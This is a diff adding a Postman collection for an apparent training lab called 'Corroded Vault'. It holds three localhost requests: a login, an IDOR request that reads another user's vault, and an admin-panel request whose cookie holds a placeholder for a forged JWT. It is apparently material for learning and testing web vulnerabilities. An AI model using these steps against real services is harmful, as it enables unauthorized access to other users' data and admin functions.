@@ -1,0 +1,40 @@
+{
+	"info": {
+		"name": "Corroded Vault - Security Lab",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+	},
+	"item": [
+		{
+			"name": "1. Login (Get Token)",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "urlencoded",
+					"urlencoded": [
+						{ "key": "username", "value": "alice", "type": "text" }
+					]
+				},
+				"url": { "raw": "http://127.0.0.1:5000/login", "host": ["127", "0", "0", "1"], "port": "5000", "path": ["login"] }
+			}
+		},
+		{
+			"name": "2. IDOR Exploit (View Other Vaults)",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": { "raw": "http://127.0.0.1:5000/api/vault/2", "host": ["127", "0", "0", "1"], "port": "5000", "path": ["api", "vault", "2"] }
+			}
+		},
+		{
+			"name": "3. Admin Panel (JWT Hijack)",
+			"request": {
+				"method": "GET",
+				"header": [
+					{ "key": "Cookie", "value": "auth_token=<PASTE_EXPLOIT_JWT_HERE>", "type": "text" }
+				],
+				"url": { "raw": "http://127.0.0.1:5000/admin", "host": ["127", "0", "0", "1"], "port": "5000", "path": ["admin"] }
+			}
+		}
+	]
+}
